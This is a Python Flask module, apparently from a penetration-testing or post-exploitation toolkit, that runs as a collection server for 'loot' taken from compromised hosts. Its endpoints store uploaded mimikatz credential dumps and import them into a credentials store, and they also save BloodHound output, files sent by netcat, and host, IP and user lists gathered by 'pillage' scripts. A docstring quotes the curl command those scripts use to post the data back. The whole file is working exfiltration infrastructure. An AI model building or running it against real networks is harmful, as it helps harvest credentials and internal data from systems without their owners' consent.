"""
Maybe combine to another file?
"""

from flask import Blueprint, request, send_from_directory
import hh.utils
from app import db
import log
from models import Host
import os
import json
import re

import hh.creds

upload = Blueprint('upload', __name__, url_prefix='/upload')


@upload.route('/mimikatz/<hostname>', methods=['POST'])
def win_log_upload(hostname):
    """
    Used by
        - win pillage
    """
    hostname = hostname.lower()

    file = request.files['file']

    # we store it in the local folder
    root = os.getcwd()
    loot_folder = os.path.join(root, 'loot', hostname)
    os.makedirs(loot_folder, exist_ok=True)

    filename = hostname + '-mimikatz.log'
    full_path = os.path.join(loot_folder, filename)
    file.save(full_path)

    hh.creds.creds_add(interactive=False, file=True, filepath=full_path, clipboard=False, mode_selection=False)
    return 'OK'


@upload.route('/nc/<hostname>', methods=['POST'])
def nc_hostname(hostname):
    """
    What? You can upload file with nc? Yes you can.
    """
    hostname = hostname.lower()
    root = os.getcwd()
    loot_folder = os.path.join(root, 'loot', hostname)
    os.makedirs(loot_folder, exist_ok=True)

    filename = request.headers.get('X-FILE-NAME', '').replace('/', '_')
    data = request.data.decode('UTF-8')
    full_path = os.path.join(loot_folder, f'{hostname}-' + filename)
    with open(full_path, 'w') as f:
        f.write(data)
    return 'OK'


# maybe rename to files?
@upload.route('/generic/<hostname>', methods=['POST'])
def generic_hostname(hostname):
    """
    Any file that is posted to this endpoint get saved in the respective loot folder

    Used by:
        - lin pillage
    """
    hostname = hostname.lower()

    file = request.files['file']
    # we store it in the local folder
    root = os.getcwd()
    loot_folder = os.path.join(root, 'loot', hostname)
    os.makedirs(loot_folder, exist_ok=True)
    full_path = os.path.join(loot_folder, f'{hostname}-' + file.filename)
    file.save(full_path)
    return 'OK'


@upload.route('/bloodhound', methods=['POST'])
def bloodhound_upload():
    """
    Used by:
        - win autohound
        - win bloodhound
    """
    file = request.files['file']
    # we store it in the local folder
    root = os.getcwd()
    loot_folder = os.path.join(root, 'loot')
    os.makedirs(loot_folder, exist_ok=True)
    full_path = os.path.join(loot_folder, file.filename)
    file.save(full_path)

    return 'OK'


@upload.route('/sysinfo/win/<hostname>', methods=['POST'])
def sysinfo_win_hostname(hostname):
    """
    Used by:
        - win pillage
    """
    # we store it in the local folder

    if not request.is_json:
        return 'NOK'

    hostname = hostname.lower()

    filename = hostname + '-sysinfo.log'
    root = os.getcwd()
    loot_folder = os.path.join(root, 'loot', hostname)
    os.makedirs(loot_folder, exist_ok=True)

    full_path = os.path.join(loot_folder, filename)
    with open(full_path, 'w') as f:
        json.dump(request.json, f, indent=4)

    # parsing - PAIN
    # powershell 5.1 does not create an array if there is only one result
    ips = get_values(request.json['local_ips'], 'IPAddress')
    local_users = get_values(request.json['local_users'], 'Name')
    user_profiles = get_values(request.json['user_profiles'], 'Name')

    # associate data to host in db - we match with ip
    hosts = db.session.query(Host).filter(Host.address.in_(ips)).all()

    log.debug(f'Got data from {hostname} found {len(hosts)} hosts in the database for this address')

    for host in hosts:
        # set name
        log.debug(f'Updating {host.id}')
        if host.name is None:
            host.name = hostname.lower()

        host.nics = ','.join(ips)
        host.local_users = ','.join(local_users)
        host.user_profiles = ','.join(user_profiles)
    db.session.commit()
    return 'OK'


@upload.route('/sysinfo/lin/<hostname>', methods=['POST'])
def sysinfo_lin_hostname(hostname):
    """
    Fucky wucky, because of content type and format currently posting like this

    > curl -X POST "${1}upload/data/$(hostname)" -d "users=$users"

    This will create a form with he field "users"

    Used by:
        - lin pillage
    """
    # we store it in the local folder
    hostname = hostname.lower()
    root = os.getcwd()
    loot_folder = os.path.join(root, 'loot', hostname)
    os.makedirs(loot_folder, exist_ok=True)
    full_path = os.path.join(loot_folder, f'{hostname}-sysinfo.log')

    user_profiles = None
    ips = None
    with open(full_path, 'w') as f:
        if request.form:
            for k, v in request.form.items():
                f.write(f'[{k}]\n')
                f.write(f'{v}\n\n')

                if k == 'users':
                    user_profiles = ','.join(v.splitlines())
                elif k == 'network':
                    ips = parse_ip_brief(v)

    # associate data to host in db - we match with ip
    hosts = db.session.query(Host).filter(Host.address.in_(ips)).all()

    log.debug(f'Got data from {hostname} found {len(hosts)} hosts in the database for this address')

    for host in hosts:
        # set name
        log.debug(f'Updating {host.id}')
        if host.name is None:
            host.name = hostname.lower()

        host.nics = ','.join(ips)
        # need to parse /etc/passwd ...
        # host.local_users = ','.join(local_users)
        host.user_profiles = user_profiles
    db.session.commit()

    return 'OK'


def parse_ip_brief(data):
    """
    This function parses the command 
    > ip -brief a

    :returns: list of ips
    """
    ips = []
    RE_IP = r'(?P<IP>((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4})'
    for line in data.splitlines():
        match = re.search(RE_IP, line)
        if match:
            if match[0] == '127.0.0.1':
                continue
            ips.append(match[0])

    return ips


def get_values(object, key):
    """
    Powershell does not create an arry if there is only one result:

    Option 1:
    "local_ips": {
        "IPAddress": "172.16.109.50"
    }

    Option 2:
    "user_profiles": [
        {
            "Name": "Administrator"
        },
        {
            "Name": "administrator.COWMOTORS-INT"
        },
        {
            "Name": "john.forster"
        },
        {
            "Name": "Public"
        }
    ],
    """

    if type(object) is dict:
        return [object.get(key)]

    if type(object) is list:
        results = []
        for item in object:
            results.append(item.get(key))
        return results
